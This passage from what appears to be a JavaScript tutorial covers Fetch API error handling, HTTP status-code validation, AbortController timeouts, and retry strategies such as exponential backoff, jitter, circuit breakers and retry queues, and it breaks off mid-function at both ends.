    if (result.status === 'fulfilled') {
      successful.push({ url: urls[index], data: result.value });
    } else {
      failed.push({ url: urls[index], error: result.reason });
    }
  });
  
  if (failed.length > 0) {
    console.warn(`${failed.length} requests failed:`, failed);
  }
  
  return { successful, failed };
}
```

### Type-Safe Error Handling

Create custom error classes:

```javascript
class FetchError extends Error {
  constructor(message, response = null, cause = null) {
    super(message);
    this.name = 'FetchError';
    this.response = response;
    this.cause = cause;
  }
}

class NetworkError extends FetchError {
  constructor(message, cause) {
    super(message, null, cause);
    this.name = 'NetworkError';
  }
}

class HTTPError extends FetchError {
  constructor(response) {
    super(`HTTP ${response.status}: ${response.statusText}`, response);
    this.name = 'HTTPError';
    this.status = response.status;
  }
}

async function fetchTyped(url) {
  try {
    const response = await fetch(url);
    
    if (!response.ok) {
      throw new HTTPError(response);
    }
    
    return await response.json();
  } catch (error) {
    if (error instanceof HTTPError) {
      console.error('HTTP error:', error.status);
      throw error;
    }
    
    if (error.name === 'AbortError') {
      throw error;
    }
    
    // Network or other error
    throw new NetworkError('Network request failed', error);
  }
}
```

### Debugging Promise Rejections

Log detailed information for debugging:

```javascript
async function fetchWithDebugInfo(url, options = {}) {
  const startTime = performance.now();
  
  console.log('Fetch started:', {
    url,
    method: options.method || 'GET',
    timestamp: new Date().toISOString()
  });
  
  try {
    const response = await fetch(url, options);
    const duration = performance.now() - startTime;
    
    console.log('Fetch completed:', {
      url,
      status: response.status,
      ok: response.ok,
      redirected: response.redirected,
      duration: `${duration.toFixed(2)}ms`
    });
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }
    
    return response;
  } catch (error) {
    const duration = performance.now() - startTime;
    
    console.error('Fetch failed:', {
      url,
      error: error.message,
      name: error.name,
      duration: `${duration.toFixed(2)}ms`,
      stack: error.stack
    });
    
    throw error;
  }
}
```

### Common Pitfalls

#### Not Checking response.ok

```javascript
// ❌ Wrong - treats 404 as success
const data = await fetch(url).then(r => r.json());

// ✓ Correct - checks response status
const response = await fetch(url);
if (!response.ok) throw new Error(`HTTP ${response.status}`);
const data = await response.json();
```

#### Forgetting to Handle JSON Parsing

```javascript
// ❌ Wrong - parsing error not caught
try {
  const response = await fetch(url);
  return response.json(); // If this fails, error escapes try block
} catch (error) {
  console.error('Only catches fetch errors, not parsing errors');
}

// ✓ Correct - await inside try block
try {
  const response = await fetch(url);
  return await response.json(); // Both fetch and parse errors caught
} catch (error) {
  console.error('Catches all errors');
}
```

#### Swallowing Errors

```javascript
// ❌ Wrong - error disappears
fetch(url).catch(() => {
  console.log('Error occurred');
  // No re-throw or return value
});

// ✓ Correct - error propagated or handled
fetch(url)
  .then(r => r.json())
  .catch(error => {
    console.error('Error:', error);
    throw error; // or return fallback value
  });
```

---

## Status Code Validation

### HTTP Status Code Ranges

HTTP status codes are three-digit integers grouped into five classes:

- **1xx (Informational)**: Request received, continuing process
- **2xx (Success)**: Request successfully received, understood, and accepted
- **3xx (Redirection)**: Further action needed to complete the request
- **4xx (Client Error)**: Request contains bad syntax or cannot be fulfilled
- **5xx (Server Error)**: Server failed to fulfill a valid request

### The `ok` Property

The `Response.ok` property is a boolean indicating whether the response was successful. It returns `true` for status codes in the range **200-299**, and `false` otherwise.

```javascript
const response = await fetch('/api/data');

if (response.ok) {
  const data = await response.json();
} else {
  console.error('Request failed');
}
```

**Important Distinction**: `response.ok` only checks the status code range. It does not indicate whether the body contains valid data or whether the response matches expectations.

### Status Code Properties

**`response.status`**: The numeric HTTP status code (e.g., 200, 404, 500).

**`response.statusText`**: The status message corresponding to the status code (e.g., "OK", "Not Found", "Internal Server Error").

```javascript
const response = await fetch('/api/data');

console.log(response.status);     // 404
console.log(response.statusText); // "Not Found"
console.log(response.ok);         // false
```

### Fetch Does Not Reject on HTTP Errors

A critical behavior of the Fetch API: **fetch only rejects on network failures**, not HTTP error status codes. A response with status 404 or 500 still resolves the promise.

```javascript
try {
  const response = await fetch('/api/data');
  // This executes even if status is 404, 500, etc.
  console.log('Fetch succeeded');
} catch (error) {
  // Only catches network errors (DNS failure, connection refused, etc.)
  console.error('Network error:', error);
}
```

### Manual Status Validation

To treat HTTP errors as exceptions, check `response.ok` and throw manually:

```javascript
const response = await fetch('/api/data');

if (!response.ok) {
  throw new Error(`HTTP error! status: ${response.status}`);
}

const data = await response.json();
```

**Pattern with try-catch**:

```javascript
try {
  const response = await fetch('/api/data');
  
  if (!response.ok) {
    throw new Error(`HTTP error! status: ${response.status}`);
  }
  
  const data = await response.json();
  return data;
} catch (error) {
  console.error('Request failed:', error);
}
```

### Granular Status Code Handling

Different status codes often require different handling logic:

```javascript
const response = await fetch('/api/data');

switch (response.status) {
  case 200:
    return await response.json();
  
  case 204:
    return null; // No content
  
  case 400:
    const errorData = await response.json();
    throw new Error(`Bad request: ${errorData.message}`);
  
  case 401:
    // Redirect to login
    window.location.href = '/login';
    break;
  
  case 403:
    throw new Error('Access forbidden');
  
  case 404:
    throw new Error('Resource not found');
  
  case 429:
    const retryAfter = response.headers.get('Retry-After');
    throw new Error(`Rate limited. Retry after ${retryAfter} seconds`);
  
  case 500:
  case 502:
  case 503:
    throw new Error('Server error. Please try again later');
  
  default:
    throw new Error(`Unexpected status: ${response.status}`);
}
```

### Range-Based Validation

Checking specific status code ranges:

```javascript
const response = await fetch('/api/data');

// Success range (2xx)
if (response.status >= 200 && response.status < 300) {
  return await response.json();
}

// Client error range (4xx)
if (response.status >= 400 && response.status < 500) {
  throw new Error('Client error');
}

// Server error range (5xx)
if (response.status >= 500 && response.status < 600) {
  throw new Error('Server error');
}
```

### Custom Validation Helper

Creating a reusable validation function:

```javascript
async function validateResponse(response) {
  if (!response.ok) {
    const errorBody = await response.text();
    const error = new Error(`HTTP ${response.status}: ${response.statusText}`);
    error.status = response.status;
    error.statusText = response.statusText;
    error.body = errorBody;
    throw error;
  }
  return response;
}

// Usage
const response = await fetch('/api/data');
await validateResponse(response);
const data = await response.json();
```

### Enhanced Error Information

Extracting error details from response body:

```javascript
async function handleError(response) {
  let errorMessage = `HTTP ${response.status}: ${response.statusText}`;
  
  const contentType = response.headers.get('content-type');
  
  if (contentType && contentType.includes('application/json')) {
    const errorData = await response.json();
    errorMessage += ` - ${errorData.message || JSON.stringify(errorData)}`;
  } else {
    const errorText = await response.text();
    if (errorText) {
      errorMessage += ` - ${errorText}`;
    }
  }
  
  throw new Error(errorMessage);
}

const response = await fetch('/api/data');
if (!response.ok) {
  await handleError(response);
}
```

### Redirects and Status Codes

**Automatic Redirect Handling**: By default, fetch follows redirects (3xx status codes) automatically. The final response reflects the redirected URL.

```javascript
const response = await fetch('/old-url'); // Redirects to /new-url
console.log(response.url);        // https://example.com/new-url
console.log(response.status);     // 200 (final status)
console.log(response.redirected); // true
```

**Manual Redirect Handling**: Set `redirect: 'manual'` to prevent automatic following:

```javascript
const response = await fetch('/old-url', { redirect: 'manual' });
console.log(response.status); // 301, 302, 307, etc.
console.log(response.type);   // "opaqueredirect"
```

### Informational Status Codes (1xx)

Fetch typically does not expose 1xx status codes to JavaScript. These are handled at the protocol level:

- **100 Continue**: Client should continue with request
- **101 Switching Protocols**: Server is switching protocols (e.g., to WebSocket)

[Inference] These status codes are processed by the browser's network stack before the response reaches JavaScript.

### Specific Status Code Scenarios

**204 No Content**:

```javascript
const response = await fetch('/api/delete', { method: 'DELETE' });

if (response.status === 204) {
  console.log('Deleted successfully, no content returned');
  // Don't attempt to parse body
}
```

**304 Not Modified**:

```javascript
const response = await fetch('/api/data', {
  headers: { 'If-None-Match': etag }
});

if (response.status === 304) {
  console.log('Use cached version');
  // Body will be empty
}
```

**401 vs 403**:

- **401 Unauthorized**: Authentication required or failed
- **403 Forbidden**: Authenticated but lacks permission

```javascript
if (response.status === 401) {
  // Redirect to login or refresh token
  await refreshAuthToken();
} else if (response.status === 403) {
  // Show "access denied" message
  alert('You do not have permission to access this resource');
}
```

### Retry Logic Based on Status Codes

Certain status codes warrant retry attempts:

```javascript
async function fetchWithRetry(url, options = {}, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    const response = await fetch(url, options);
    
    // Success
    if (response.ok) {
      return response;
    }
    
    // Don't retry client errors (except 408, 429)
    if (response.status >= 400 && response.status < 500) {
      if (response.status === 408 || response.status === 429) {
        // Request Timeout or Rate Limited - retry
        await delay(Math.pow(2, i) * 1000); // Exponential backoff
        continue;
      }
      throw new Error(`Client error: ${response.status}`);
    }
    
    // Retry server errors (5xx)
    if (response.status >= 500 && i < maxRetries - 1) {
      await delay(Math.pow(2, i) * 1000);
      continue;
    }
    
    throw new Error(`Server error: ${response.status}`);
  }
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
```

### Validation in Service Workers

Service workers can intercept and validate responses before returning them:

```javascript
self.addEventListener('fetch', event => {
  event.respondWith(
    fetch(event.request).then(response => {
      if (!response.ok) {
        // Log error
        console.error(`Failed request: ${response.status}`);
        
        // Return custom error response
        return new Response(
          JSON.stringify({ error: 'Request failed' }), 
          { 
            status: response.status,
            headers: { 'Content-Type': 'application/json' }
          }
        );
      }
      
      return response;
    })
  );
});
```

### TypeScript Type Guards

Creating type-safe status validation:

```typescript
function isSuccessStatus(status: number): status is 200 | 201 | 204 {
  return status >= 200 && status < 300;
}

function isClientError(status: number): boolean {
  return status >= 400 && status < 500;
}

function isServerError(status: number): boolean {
  return status >= 500 && status < 600;
}

const response = await fetch('/api/data');

if (isSuccessStatus(response.status)) {
  // TypeScript knows this is a success status
  const data = await response.json();
}
```

### Wrapper Function Pattern

Abstracting validation into a fetch wrapper:

```javascript
async function fetchJSON(url, options = {}) {
  const response = await fetch(url, options);
  
  // Handle no content
  if (response.status === 204) {
    return null;
  }
  
  // Validate status
  if (!response.ok) {
    let errorMessage = `HTTP ${response.status}`;
    
    try {
      const errorData = await response.json();
      errorMessage = errorData.message || errorData.error || errorMessage;
    } catch {
      // If JSON parsing fails, use status text
      errorMessage = response.statusText || errorMessage;
    }
    
    const error = new Error(errorMessage);
    error.status = response.status;
    throw error;
  }
  
  return response.json();
}

// Usage
try {
  const data = await fetchJSON('/api/data');
} catch (error) {
  console.error(`Failed with status ${error.status}:`, error.message);
}
```

### Testing Status Code Handling

Mock responses for different status codes:

```javascript
// Mock fetch for testing
global.fetch = jest.fn((url) => {
  if (url.includes('success')) {
    return Promise.resolve({
      ok: true,
      status: 200,
      json: () => Promise.resolve({ data: 'success' })
    });
  }
  
  if (url.includes('not-found')) {
    return Promise.resolve({
      ok: false,
      status: 404,
      statusText: 'Not Found',
      json: () => Promise.resolve({ error: 'Not found' })
    });
  }
  
  if (url.includes('server-error')) {
    return Promise.resolve({
      ok: false,
      status: 500,
      statusText: 'Internal Server Error'
    });
  }
});
```

---

## Timeout Handling

### Native AbortController Approach

The Fetch API doesn't have built-in timeout functionality, but you can implement timeouts using `AbortController` and `AbortSignal`.

**Basic timeout implementation:**

```javascript
const controller = new AbortController();
const timeoutId = setTimeout(() => controller.abort(), 5000);

try {
  const response = await fetch('https://api.example.com/data', {
    signal: controller.signal
  });
  clearTimeout(timeoutId);
  const data = await response.json();
} catch (error) {
  if (error.name === 'AbortError') {
    console.error('Request timed out');
  } else {
    console.error('Request failed:', error);
  }
}
```

### Timeout During JSON Parsing

The timeout approach above only covers the fetch request itself, not the `response.json()` parsing phase. To include parsing:

```javascript
const controller = new AbortController();
const timeoutId = setTimeout(() => controller.abort(), 5000);

try {
  const response = await fetch('https://api.example.com/data', {
    signal: controller.signal
  });
  
  const data = await response.json();
  clearTimeout(timeoutId); // Clear after parsing completes
  
} catch (error) {
  clearTimeout(timeoutId);
  if (error.name === 'AbortError') {
    console.error('Request or parsing timed out');
  }
  throw error;
}
```

**Important:** `AbortSignal` doesn't directly interrupt `response.json()` parsing once it has started. [Inference] The timeout will only trigger if the entire operation (fetch + parsing) hasn't completed within the timeout period.

### Reusable Timeout Function

```javascript
async function fetchWithTimeout(url, options = {}, timeout = 5000) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeout);
  
  try {
    const response = await fetch(url, {
      ...options,
      signal: controller.signal
    });
    
    return response;
    
  } finally {
    clearTimeout(timeoutId);
  }
}

// Usage
try {
  const response = await fetchWithTimeout('https://api.example.com/data', {}, 5000);
  const data = await response.json();
} catch (error) {
  if (error.name === 'AbortError') {
    console.error('Request timed out after 5 seconds');
  }
}
```

### Separate Timeouts for Fetch and Parsing

For large JSON responses where parsing might take significant time:

```javascript
async function fetchJSONWithTimeouts(url, fetchTimeout = 5000, parseTimeout = 3000) {
  // Fetch timeout
  const fetchController = new AbortController();
  const fetchTimeoutId = setTimeout(() => fetchController.abort(), fetchTimeout);
  
  try {
    const response = await fetch(url, { signal: fetchController.signal });
    clearTimeout(fetchTimeoutId);
    
    // Parse timeout
    const parsePromise = response.json();
    const timeoutPromise = new Promise((_, reject) => {
      setTimeout(() => reject(new Error('JSON parsing timeout')), parseTimeout);
    });
    
    const data = await Promise.race([parsePromise, timeoutPromise]);
    return data;
    
  } catch (error) {
    clearTimeout(fetchTimeoutId);
    
    if (error.name === 'AbortError') {
      throw new Error('Fetch request timed out');
    } else if (error.message === 'JSON parsing timeout') {
      throw new Error('JSON parsing took too long');
    }
    throw error;
  }
}
```

[Unverified] Whether this pattern actually interrupts JSON parsing or just rejects the promise while parsing continues in the background depends on JavaScript engine implementation.

### AbortSignal.timeout() Static Method

Modern browsers support `AbortSignal.timeout()` for simpler timeout handling:

```javascript
try {
  const response = await fetch('https://api.example.com/data', {
    signal: AbortSignal.timeout(5000)
  });
  const data = await response.json();
} catch (error) {
  if (error.name === 'TimeoutError' || error.name === 'AbortError') {
    console.error('Request timed out');
  }
}
```

**Browser support:** Chrome 103+, Firefox 100+, Safari 16+, Node.js 17.3+

### Combining Manual Abort with Timeout

You can combine user-triggered abort with automatic timeout:

```javascript
const controller = new AbortController();
const timeoutId = setTimeout(() => controller.abort(), 10000);

// User can manually abort
document.getElementById('cancelBtn').addEventListener('click', () => {
  controller.abort();
});

try {
  const response = await fetch('https://api.example.com/data', {
    signal: controller.signal
  });
  clearTimeout(timeoutId);
  const data = await response.json();
} catch (error) {
  clearTimeout(timeoutId);
  if (error.name === 'AbortError') {
    console.error('Request cancelled or timed out');
  }
}
```

### Timeout with Retry Logic

```javascript
async function fetchWithRetry(url, maxRetries = 3, timeout = 5000) {
  let lastError;
  
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), timeout);
    
    try {
      const response = await fetch(url, { signal: controller.signal });
      clearTimeout(timeoutId);
      
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }
      
      return await response.json();
      
    } catch (error) {
      clearTimeout(timeoutId);
      lastError = error;
      
      if (error.name === 'AbortError') {
        console.warn(`Attempt ${attempt + 1} timed out`);
      } else {
        console.warn(`Attempt ${attempt + 1} failed:`, error.message);
      }
      
      // Don't retry on last attempt
      if (attempt < maxRetries - 1) {
        await new Promise(resolve => setTimeout(resolve, 1000 * (attempt + 1)));
      }
    }
  }
  
  throw lastError;
}
```

### Timeout Error Detection

Different timeout scenarios produce different error types:

```javascript
try {
  const response = await fetch(url, { signal: controller.signal });
  const data = await response.json();
} catch (error) {
  if (error.name === 'AbortError') {
    // Fetch was aborted (could be timeout or manual)
    console.error('Request aborted');
  } else if (error.name === 'TimeoutError') {
    // AbortSignal.timeout() specific error
    console.error('Request timeout');
  } else if (error instanceof TypeError && error.message.includes('network')) {
    // Network failure
    console.error('Network error');
  } else if (error instanceof SyntaxError) {
    // JSON parsing failed
    console.error('Invalid JSON');
  } else {
    console.error('Unknown error:', error);
  }
}
```

### Progress Tracking with Timeout

For long-running requests, you can track progress and reset timeout on activity:

```javascript
async function fetchWithActivityTimeout(url, inactivityTimeout = 5000) {
  const controller = new AbortController();
  let timeoutId;
  
  const resetTimeout = () => {
    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => controller.abort(), inactivityTimeout);
  };
  
  resetTimeout();
  
  try {
    const response = await fetch(url, { signal: controller.signal });
    resetTimeout();
    
    const reader = response.body.getReader();
    const chunks = [];
    
    while (true) {
      const { done, value } = await reader.read();
      resetTimeout(); // Reset on each chunk
      
      if (done) break;
      chunks.push(value);
    }
    
    clearTimeout(timeoutId);
    
    // Combine chunks and parse
    const text = new TextDecoder().decode(
      new Uint8Array(chunks.reduce((acc, chunk) => [...acc, ...chunk], []))
    );
    return JSON.parse(text);
    
  } catch (error) {
    clearTimeout(timeoutId);
    throw error;
  }
}
```

### Timeout Configuration Patterns

**Global timeout configuration:**

```javascript
class APIClient {
  constructor(baseURL, defaultTimeout = 5000) {
    this.baseURL = baseURL;
    this.defaultTimeout = defaultTimeout;
  }
  
  async fetch(endpoint, options = {}) {
    const timeout = options.timeout ?? this.defaultTimeout;
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), timeout);
    
    try {
      const response = await fetch(`${this.baseURL}${endpoint}`, {
        ...options,
        signal: options.signal || controller.signal
      });
      
      clearTimeout(timeoutId);
      return response;
      
    } catch (error) {
      clearTimeout(timeoutId);
      throw error;
    }
  }
  
  async getJSON(endpoint, options = {}) {
    const response = await this.fetch(endpoint, options);
    return response.json();
  }
}

// Usage
const api = new APIClient('https://api.example.com', 10000);
const data = await api.getJSON('/users', { timeout: 3000 });
```

### Memory Cleanup

Always clear timeouts to prevent memory leaks:

```javascript
// ❌ Bad - timeout not cleared on success
const controller = new AbortController();
setTimeout(() => controller.abort(), 5000);
const response = await fetch(url, { signal: controller.signal });

// ✅ Good - timeout cleared
const controller = new AbortController();
const timeoutId = setTimeout(() => controller.abort(), 5000);
try {
  const response = await fetch(url, { signal: controller.signal });
  clearTimeout(timeoutId);
} catch (error) {
  clearTimeout(timeoutId);
  throw error;
}

// ✅ Better - use finally
const controller = new AbortController();
const timeoutId = setTimeout(() => controller.abort(), 5000);
try {
  const response = await fetch(url, { signal: controller.signal });
  return await response.json();
} finally {
  clearTimeout(timeoutId);
}
```

### Platform-Specific Considerations

**Node.js:**

- `AbortController` available in Node.js 15+
- `AbortSignal.timeout()` available in Node.js 17.3+

**Deno:**

- Full AbortController and AbortSignal support
- `AbortSignal.timeout()` supported

**React Native:**

- AbortController supported
- [Unverified] `AbortSignal.timeout()` support depends on JavaScript engine version

---

## Retry Strategies

### Basic Retry Implementation

```javascript
async function fetchWithRetry(url, options = {}, maxRetries = 3) {
  let lastError;
  
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url, options);
      
      if (response.ok) {
        return response;
      }
      
      // Don't retry on client errors (4xx)
      if (response.status >= 400 && response.status < 500) {
        throw new Error(`Client error: ${response.status}`);
      }
      
      lastError = new Error(`HTTP ${response.status}`);
      
    } catch (error) {
      lastError = error;
      
      // Don't retry on network errors if this is the last attempt
      if (i === maxRetries - 1) {
        throw lastError;
      }
    }
  }
  
  throw lastError;
}
```

### Exponential Backoff

Increases wait time exponentially between retries to avoid overwhelming the server.

```javascript
async function fetchWithExponentialBackoff(
  url, 
  options = {}, 
  maxRetries = 5,
  baseDelay = 1000
) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url, options);
      
      if (response.ok) {
        return response;
      }
      
      if (response.status >= 400 && response.status < 500) {
        throw new Error(`Client error: ${response.status}`);
      }
      
      // Calculate exponential backoff: baseDelay * 2^attempt
      const delay = baseDelay * Math.pow(2, i);
      await new Promise(resolve => setTimeout(resolve, delay));
      
    } catch (error) {
      if (i === maxRetries - 1) {
        throw error;
      }
      
      const delay = baseDelay * Math.pow(2, i);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
}
```

### Exponential Backoff with Jitter

Adds randomness to prevent thundering herd problem when multiple clients retry simultaneously.

```javascript
async function fetchWithJitter(
  url,
  options = {},
  maxRetries = 5,
  baseDelay = 1000,
  maxDelay = 30000
) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url, options);
      
      if (response.ok) {
        return response;
      }
      
      if (response.status >= 400 && response.status < 500) {
        throw new Error(`Client error: ${response.status}`);
      }
      
    } catch (error) {
      if (i === maxRetries - 1) {
        throw error;
      }
    }
    
    // Full jitter: random value between 0 and exponential backoff
    const exponentialDelay = Math.min(baseDelay * Math.pow(2, i), maxDelay);
    const jitter = Math.random() * exponentialDelay;
    
    await new Promise(resolve => setTimeout(resolve, jitter));
  }
}
```

### Decorrelated Jitter

Provides better distribution of retry attempts compared to full jitter.

```javascript
async function fetchWithDecorrelatedJitter(
  url,
  options = {},
  maxRetries = 5,
  baseDelay = 1000,
  maxDelay = 30000
) {
  let currentDelay = baseDelay;
  
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url, options);
      
      if (response.ok) {
        return response;
      }
      
      if (response.status >= 400 && response.status < 500) {
        throw new Error(`Client error: ${response.status}`);
      }
      
    } catch (error) {
      if (i === maxRetries - 1) {
        throw error;
      }
    }
    
    // Decorrelated jitter: random between baseDelay and 3 * currentDelay
    const minDelay = baseDelay;
    const maxPossibleDelay = Math.min(3 * currentDelay, maxDelay);
    currentDelay = minDelay + Math.random() * (maxPossibleDelay - minDelay);
    
    await new Promise(resolve => setTimeout(resolve, currentDelay));
  }
}
```

### Retry on Specific Status Codes

```javascript
async function fetchWithSelectiveRetry(
  url,
  options = {},
  maxRetries = 3,
  retryableStatuses = [408, 429, 500, 502, 503, 504]
) {
  let lastError;
  
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url, options);
      
      if (response.ok) {
        return response;
      }
      
      // Only retry on specific status codes
      if (!retryableStatuses.includes(response.status)) {
        throw new Error(`Non-retryable status: ${response.status}`);
      }
      
      lastError = new Error(`HTTP ${response.status}`);
      
      // Wait before retry
      await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
      
    } catch (error) {
      if (i === maxRetries - 1) {
        throw lastError || error;
      }
      
      // For network errors, always retry
      if (error instanceof TypeError) {
        await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
      } else {
        throw error;
      }
    }
  }
  
  throw lastError;
}
```

### Retry with Timeout

```javascript
async function fetchWithTimeout(url, options = {}, timeout = 5000) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeout);
  
  try {
    const response = await fetch(url, {
      ...options,
      signal: controller.signal
    });
    clearTimeout(timeoutId);
    return response;
  } catch (error) {
    clearTimeout(timeoutId);
    throw error;
  }
}

async function fetchWithRetryAndTimeout(
  url,
  options = {},
  maxRetries = 3,
  timeout = 5000,
  baseDelay = 1000
) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetchWithTimeout(url, options, timeout);
      
      if (response.ok) {
        return response;
      }
      
      if (response.status >= 400 && response.status < 500) {
        throw new Error(`Client error: ${response.status}`);
      }
      
    } catch (error) {
      if (i === maxRetries - 1) {
        throw error;
      }
      
      const delay = baseDelay * Math.pow(2, i);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
}
```

### Retry with Rate Limit Handling

Respects Retry-After header for 429 (Too Many Requests) responses.

```javascript
async function fetchWithRateLimitRetry(
  url,
  options = {},
  maxRetries = 3
) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url, options);
      
      if (response.ok) {
        return response;
      }
      
      // Handle rate limiting
      if (response.status === 429) {
        const retryAfter = response.headers.get('Retry-After');
        
        if (retryAfter) {
          // Retry-After can be in seconds or a date
          const delay = isNaN(retryAfter)
            ? new Date(retryAfter) - Date.now()
            : parseInt(retryAfter) * 1000;
          
          await new Promise(resolve => setTimeout(resolve, delay));
          continue;
        }
      }
      
      if (response.status >= 400 && response.status < 500 && response.status !== 429) {
        throw new Error(`Client error: ${response.status}`);
      }
      
      // Default backoff for server errors
      const delay = 1000 * Math.pow(2, i);
      await new Promise(resolve => setTimeout(resolve, delay));
      
    } catch (error) {
      if (i === maxRetries - 1) {
        throw error;
      }
      
      const delay = 1000 * Math.pow(2, i);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
}
```

### Circuit Breaker Pattern

Prevents repeated attempts to a failing service by temporarily "opening" the circuit.

```javascript
class CircuitBreaker {
  constructor(threshold = 5, timeout = 60000) {
    this.failureCount = 0;
    this.threshold = threshold;
    this.timeout = timeout;
    this.state = 'CLOSED'; // CLOSED, OPEN, HALF_OPEN
    this.nextAttempt = Date.now();
  }
  
  async execute(fn) {
    if (this.state === 'OPEN') {
      if (Date.now() < this.nextAttempt) {
        throw new Error('Circuit breaker is OPEN');
      }
      this.state = 'HALF_OPEN';
    }
    
    try {
      const result = await fn();
      this.onSuccess();
      return result;
    } catch (error) {
      this.onFailure();
      throw error;
    }
  }
  
  onSuccess() {
    this.failureCount = 0;
    this.state = 'CLOSED';
  }
  
  onFailure() {
    this.failureCount++;
    if (this.failureCount >= this.threshold) {
      this.state = 'OPEN';
      this.nextAttempt = Date.now() + this.timeout;
    }
  }
}

// Usage
const breaker = new CircuitBreaker(5, 60000);

async function fetchWithCircuitBreaker(url, options = {}) {
  return breaker.execute(async () => {
    const response = await fetch(url, options);
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }
    return response;
  });
}
```

### Retry with Progress Tracking

```javascript
async function fetchWithRetryProgress(
  url,
  options = {},
  maxRetries = 3,
  onProgress = null
) {
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    try {
      if (onProgress) {
        onProgress({ attempt, maxRetries, status: 'attempting' });
      }
      
      const response = await fetch(url, options);
      
      if (response.ok) {
        if (onProgress) {
          onProgress({ attempt, maxRetries, status: 'success' });
        }
        return response;
      }
      
      if (response.status >= 400 && response.status < 500) {
        if (onProgress) {
          onProgress({ attempt, maxRetries, status: 'failed', error: `HTTP ${response.status}` });
        }
        throw new Error(`Client error: ${response.status}`);
      }
      
    } catch (error) {
      if (attempt === maxRetries) {
        if (onProgress) {
          onProgress({ attempt, maxRetries, status: 'exhausted', error: error.message });
        }
        throw error;
      }
      
      const delay = 1000 * Math.pow(2, attempt - 1);
      
      if (onProgress) {
        onProgress({ attempt, maxRetries, status: 'retrying', delay });
      }
      
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
}

// Usage
await fetchWithRetryProgress('/api/data', {}, 3, (progress) => {
  console.log(`Attempt ${progress.attempt}/${progress.maxRetries}: ${progress.status}`);
});
```

### Configurable Retry Strategy

```javascript
class RetryStrategy {
  constructor(config = {}) {
    this.maxRetries = config.maxRetries || 3;
    this.baseDelay = config.baseDelay || 1000;
    this.maxDelay = config.maxDelay || 30000;
    this.timeout = config.timeout || 0;
    this.retryableStatuses = config.retryableStatuses || [408, 429, 500, 502, 503, 504];
    this.backoffStrategy = config.backoffStrategy || 'exponential'; // 'exponential', 'linear', 'constant'
    this.jitter = config.jitter !== false; // default true
    this.onRetry = config.onRetry || null;
  }
  
  calculateDelay(attempt) {
    let delay;
    
    switch (this.backoffStrategy) {
      case 'linear':
        delay = this.baseDelay * attempt;
        break;
      case 'constant':
        delay = this.baseDelay;
        break;
      case 'exponential':
      default:
        delay = this.baseDelay * Math.pow(2, attempt);
    }
    
    delay = Math.min(delay, this.maxDelay);
    
    if (this.jitter) {
      delay = Math.random() * delay;
    }
    
    return delay;
  }
  
  shouldRetry(response, error, attempt) {
    if (attempt >= this.maxRetries) {
      return false;
    }
    
    if (error) {
      // Retry on network errors
      return error instanceof TypeError;
    }
    
    if (response) {
      // Don't retry on success
      if (response.ok) {
        return false;
      }
      
      // Check if status is retryable
      return this.retryableStatuses.includes(response.status);
    }
    
    return false;
  }
  
  async execute(url, options = {}) {
    let attempt = 0;
    let lastError;
    
    while (attempt < this.maxRetries) {
      try {
        const controller = this.timeout > 0 ? new AbortController() : null;
        const timeoutId = controller ? setTimeout(() => controller.abort(), this.timeout) : null;
        
        const response = await fetch(url, {
          ...options,
          signal: controller?.signal
        });
        
        if (timeoutId) clearTimeout(timeoutId);
        
        if (response.ok) {
          return response;
        }
        
        if (!this.shouldRetry(response, null, attempt)) {
          throw new Error(`HTTP ${response.status}`);
        }
        
        lastError = new Error(`HTTP ${response.status}`);
        
      } catch (error) {
        lastError = error;
        
        if (!this.shouldRetry(null, error, attempt)) {
          throw error;
        }
      }
      
      const delay = this.calculateDelay(attempt);
      
      if (this.onRetry) {
        this.onRetry({
          attempt: attempt + 1,
          maxRetries: this.maxRetries,
          delay,
          error: lastError
        });
      }
      
      await new Promise(resolve => setTimeout(resolve, delay));
      attempt++;
    }
    
    throw lastError;
  }
}

// Usage examples
const strategy = new RetryStrategy({
  maxRetries: 5,
  baseDelay: 1000,
  maxDelay: 30000,
  backoffStrategy: 'exponential',
  jitter: true,
  timeout: 5000,
  onRetry: (info) => console.log(`Retrying attempt ${info.attempt}...`)
});

const response = await strategy.execute('/api/data');
```

### Retry Queue for Multiple Requests

```javascript
class RetryQueue {
  constructor(maxConcurrent = 3) {
    this.queue = [];
    this.active = 0;
    this.maxConcurrent = maxConcurrent;
  }
  
  async add(fn) {
    return new Promise((resolve, reject) => {
      this.queue.push({ fn, resolve, reject });
      this.process();
    });
  }
  
  async process() {
    if (this.active >= this.maxConcurrent || this.queue.length === 0) {
      return;
    }
    
    this.active++;
    const { fn, resolve, reject } = this.queue.shift();
    
    try {
      const result = await fn();
      resolve(result);
    } catch (error) {
      reject(error);
    } finally {
      this.active--;
      this.process();
    }
  }
}

// Usage
const queue = new RetryQueue(3);

const results = await Promise.all([
  queue.add(() => fetchWithRetry('/api/data1')),
  queue.add(() => fetchWithRetry('/api/data2')),
  queue.add(() => fetchWithRetry('/api/data3')),
  queue.add(() => fetchWithRetry('/api/data4')),
  queue.add(() => fetchWithRetry('/api/data5'))
]);
```

### Retry with Fallback

```javascript
async function fetchWithFallback(
  primaryUrl,
